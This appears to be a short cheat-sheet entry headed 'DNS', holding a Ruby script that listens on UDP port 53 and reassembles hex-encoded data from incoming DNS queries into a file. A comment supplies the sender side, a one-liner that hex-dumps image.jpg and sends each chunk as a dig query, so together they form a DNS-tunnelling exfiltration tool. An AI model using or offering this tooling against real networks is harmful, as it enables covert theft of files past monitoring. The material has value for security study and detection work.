# DNS 

```ruby
#!/usr/bin/env ruby
#
# for c in $(xxd -p image.jpg); do dig @localhost $c; done
# 
require 'socket'

if ARGV.size < 1
  puts "[+] sudp ruby #{__FILE__} <FILENAME>"
  exit
else
  file = ARGV[0]
end

udpsoc = UDPSocket.new
udpsoc.bind('0.0.0.0', 53)

begin

  data     = ''
  data_old = ''
  
  loop do
    response = udpsoc.recvfrom(10000)
    response = response[0].force_encoding("ISO-8859-1").encode("utf-8")
    data = response.match(/[a-f0-9]([a-f0-9]).*[a-f0-9]([a-f0-9])/i).to_s
    
    File.open(file, 'a') do |d|
      d.write [data].pack("H*") unless data == data_old
      puts data unless data == data_old
    end
    
    data_old = data 
  end

rescue Exception => e
  puts e
end
```